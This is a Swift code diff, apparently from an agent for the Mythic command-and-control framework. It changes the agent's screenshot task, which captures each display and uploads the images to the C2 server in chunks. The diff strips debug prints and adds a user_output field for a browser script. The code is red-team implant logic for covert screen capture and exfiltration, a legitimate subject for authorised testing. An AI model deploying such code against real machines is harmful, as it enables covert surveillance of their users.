@@ -224,7 +224,6 @@ func executeTask(job: Job, jobList: JobList) {
         // Gather total number of displays to download
         if job.screenshotTotalDisplays == 0 {
             getTotalDisplays(job: job)
-            print("TOTAL_DISPLAYS", job.screenshotTotalDisplays)
         }
         // Start cycling through displays
         else if job.screenshotDisplayNumber < job.screenshotTotalDisplays {
@@ -234,6 +233,17 @@ func executeTask(job: Job, jobList: JobList) {
             }
             // If job already has a file_id, download a chunk of the file
             else {
+                // For screencapture_new browser script
+                if (job.downloadChunkNumber == 1) {
+                    let jsonUserOutput = JSON([
+                        "file_id": job.downloadFileID,
+                        "total_chunks": job.downloadTotalChunks,
+                    ])
+                    job.result = jsonUserOutput.rawString() ?? ""
+                }
+                else {
+                    job.result = ""
+                }
                 downloadScreenshotChunk(job: job)
             }
         }
@@ -404,6 +414,7 @@ func postResponse(jobList: JobList) {
                     "file_id": job.downloadFileID,
                     "chunk_data": job.downloadChunkData,
                     "task_id": job.taskID,
+                    "user_output": job.result,
                 ])
                 jsonJobOutput.append(jsonResponse)
                 job.downloadChunkNumber = job.downloadChunkNumber + 1
@@ -487,16 +498,13 @@ func postResponse(jobList: JobList) {
                         // Save file_id returned from Mythic for first download message
                         if ((job.downloadFileID == "") && (responses["file_id"].exists())) {
                             job.downloadFileID = responses["file_id"].stringValue
-                            print("SAVING_FILEID", job.downloadFileID)
                         }
                         // Delete job if download task is complete
                         else if job.screenshotDisplayNumber >= job.screenshotTotalDisplays {
                             jobList.jobs.remove(at: index)
-                            print("screenshot job removed")
                         }
                         // Once download is complete, reset job variables for multiple displays
                         else if (job.downloadChunkNumber > job.downloadTotalChunks) && (job.screenshotDisplayNumber < job.screenshotTotalDisplays) {
-                            print("upload done, moving onto next display")
                             job.screenshotDisplayNumber += 1
                             job.downloadFileID = ""
                             job.downloadChunkNumber = 0
@@ -506,7 +514,6 @@ func postResponse(jobList: JobList) {
                         }
                         // Error may have occurred when getting file_id from Mythic, remove the job
                         else if job.downloadTotalChunks == 0 {
-                            print("error, removing screenshot job")
                             jobList.jobs.remove(at: index)
                         }
                     }
